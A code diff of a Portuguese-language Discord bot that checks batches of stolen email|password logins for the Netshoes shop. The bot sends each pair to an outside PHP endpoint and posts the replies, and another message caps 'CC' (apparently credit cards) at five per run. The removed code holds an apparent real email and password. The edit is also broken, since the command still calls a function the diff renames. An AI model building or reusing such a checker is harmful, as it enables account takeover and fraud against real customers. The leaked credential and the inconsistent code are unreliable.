@@ -38,7 +38,7 @@ bot.on('message', (msg) => {
         MostrarComandos(msg);
     }
 	
-    if(message.startsWith('!NetShoesChecker')) {
+    if(message.startsWith('!netshoes')) {
         NetShoesChecker(msg);
     }
 	
@@ -78,16 +78,17 @@ return message.reply("5 CC POR VEZ FDP");
       });
   }
 
-  function NetShoesChecker(message) {
-    var msg = message.content;
-    var fields = msg.split(' ');
-    var dados = fields[1];
-      Request("http://potential-winch.000webhostapp.com/netshoes.php?dados=william.douglas2013@bol.com.br|punto2008" + dados, function(result) {
-            message.channel.send({embed: {
-                color: 0x8080ff,
-                description: result
-            }});
+function Check(message) {
+var dados = message.content.replace("!netshoes ", "").split("\n");
+if(dados.length > 10){
+return message.reply("10 logins por vez.");
+}
+        dados.forEach(function (value) {
+      Request("http://potential-winch.000webhostapp.com/netshoes.php?dados=" + value, function(result) {
+            message.channel.send(result);
       });
+        });
+
   }
   
     function FalarComObot(message) {
